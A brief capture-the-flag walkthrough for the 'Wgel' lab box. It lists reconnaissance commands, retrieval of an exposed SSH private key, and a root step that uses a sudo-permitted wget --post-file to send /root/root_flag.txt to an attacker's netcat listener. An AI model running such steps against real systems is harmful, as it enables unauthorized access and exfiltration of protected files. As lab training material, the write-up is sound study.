# Wgel CTF

Have fun with this easy box.

- User flag

	- The first thing I notice is that the port 80 is open and it diplays the Apache2 Default Page.
	- There is a comment for a certain 'Jessie'.
	- `nmap -sV <TARGET_IP>`
	- Ports open: 22 and 80.
	- `gobuster dir -u <TARGET_IP> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`
	- On `/sitemap/` interesting content.
	- Still gobuster things.
	- `http://<TARGET_IP>/sitemap/.ssh/id_rsa`
	- Use that to connect via ssh.
	- `ssh jessie@<TARGET_IP>`
	- `find ~ | grep flag`
	- `cat /home/jessie/Documents/user_flag.txt`
	- `05**671******e42d**********8ff6`

- Root flag

	- `sudo -l`
	- On your machine `nc -lnvp 4444`
	- On target `sudo /usr/bin/wget --post-file=/root/root_flag.txt <YOUR_IP>:4444`
	- `**b96******9ad1da**********9263d`
